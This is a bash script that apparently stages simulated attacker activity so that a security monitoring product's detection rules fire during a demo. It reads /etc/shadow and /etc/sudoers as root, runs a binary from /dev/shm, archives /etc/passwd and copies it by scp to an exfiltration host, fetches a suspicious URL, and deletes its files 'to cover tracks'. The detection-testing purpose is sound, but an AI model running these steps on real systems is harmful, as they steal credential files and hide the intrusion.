#!/usr/bin/env bash

set -Eeuo pipefail

# Pretty error reporter
err_report() {
  local rc=$?
  local cmd=${BASH_COMMAND}
  # Frame 0 is this function, frame 1 is where the error occurred
  echo "✖ Error $rc at ${BASH_SOURCE[1]}:${BASH_LINENO[0]} in ${FUNCNAME[1]:-main}" >&2
  echo "  → command: $cmd" >&2
  exit "$rc"
}
trap err_report ERR


# Load shared variables from config.sh
# This expects the config.sh file to be in the same directory as this script
# ***************************************************
# !!!  DO NOT MAKE VARIABLE CHANGES HERE   !!!      *
# !!!  MAKE VARIABLE CHANGES IN config.sh  !!!      *
# ***************************************************
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/config.sh"

# List of required variables
required_vars=(
  TARGET_HOST_ROOTDIR
  EXFILL_SSH_KEY
  EXFILL_TARGET
  FILE
)

# Check each one
missing=()
for var in "${required_vars[@]}"; do
  if [ -z "${!var:-}" ]; then
    missing+=("$var")
  fi
done

if [ "${#missing[@]}" -gt 0 ]; then
  echo "Error: The following required variables are not set:" >&2
  for var in "${missing[@]}"; do
    echo "  - $var" >&2
  done
  exit 1
fi

# Generate some random noise for the Event Analyzer view
/bin/echo -n "Generating some random noise for the Event Analyzer view..."
/usr/bin/whoami &>/dev/null
/usr/bin/ls &>/dev/null
printf '\033[1;32mDone\033[0m\n'

# Trigger Account Discovery alerts
/bin/echo -n "Triggering Account Discovery alerts..."
for i in {1..3}; do
  /usr/bin/groups &>/dev/null
  /usr/bin/getent passwd &>/dev/null
  sudo /bin/cat /etc/sudoers &>/dev/null
  sudo /bin/cat /etc/shadow &>/dev/null
  sleep 3
done
printf '\033[1;32mDone\033[0m\n'

# Copy C programs over and execute
/bin/echo -n "Copying binaries over and executing..."
/usr/bin/cp -p $TARGET_HOST_ROOTDIR/files/demo_progs.tar /dev/shm/ &>/dev/null
/usr/bin/tar xf /dev/shm/demo_progs.tar -C /dev/shm/ &>/dev/null
sudo /dev/shm/nothing_to_see_here -c "/usr/bin/tar czPf $FILE /etc/passwd" &>/dev/null
printf '\033[1;32mDone\033[0m\n'

# Trigger Inidcator Match Detection Rules
/bin/echo -n "Triggering Indicator Match Detection Rules..."
/usr/bin/curl http://x.com/dlr.ppc &>/dev/null
printf '\033[1;32mDone\033[0m\n'

# Trigger Malware alert with EICAR file
/bin/echo -n "Triggering Malware alert with EICAR file..."
/usr/bin/tar xf $TARGET_HOST_ROOTDIR/files/eicar_com.tar.gz &>/dev/null
printf '\033[1;32mDone\033[0m\n'

# Trigger Linux system info discovery rule
/bin/echo -n "Triggering Linux system info discovery rule..."
for i in {1..4}; do
  /usr/bin/uname -r &>/dev/null
  /usr/bin/uname -o &>/dev/null
  /usr/bin/uname -m &>/dev/null
  /usr/bin/uname -p &>/dev/null
  /usr/bin/uname -a &>/dev/null
  /usr/bin/uname -n &>/dev/null
  sleep 4
done
printf '\033[1;32mDone\033[0m\n'

if [ -f "$FILE" ]; then
  /bin/echo -n "Copying $FILE to $EXFILL_TARGET..."
  /usr/bin/scp -i $EXFILL_SSH_KEY $FILE $EXFILL_SSH_USER@$EXFILL_TARGET:~/  
fi
printf '\033[1;32mDone\033[0m\n'

#######################
##      CLEANUP      ##
#######################
# Remove all files from /dev/shm to cover tracks.
# You can show this in the Event Analyzer, and then show the process still running
# in memory with OSquery
if [ $? -eq 0 ]; then
  /bin/echo -n "Removing files from /dev/shm..."
  sudo /usr/bin/rm -f /dev/shm/{nothing_to_see_here,move_along,demo_progs.tar} $FILE &>/dev/null
fi 
printf '\033[1;32mDone\033[0m\n'

exit
